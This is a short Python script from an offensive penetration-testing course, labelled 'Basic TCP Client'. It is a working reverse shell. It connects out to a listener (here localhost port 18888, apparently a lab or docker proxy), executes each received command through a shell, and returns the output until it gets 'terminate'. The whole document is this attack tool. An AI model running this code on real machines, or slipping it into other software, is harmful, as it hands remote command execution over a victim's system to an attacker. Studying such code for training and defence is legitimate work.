# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Client

import socket
import subprocess

def connect(docker_proxy_port=18888):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('127.0.0.1', docker_proxy_port))
    while True:
        command = s.recv(1024)

        if b'terminate' in command:
            s.close()
            break 
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() )
            s.send( CMD.stderr.read() )

def main ():
    connect()

main()
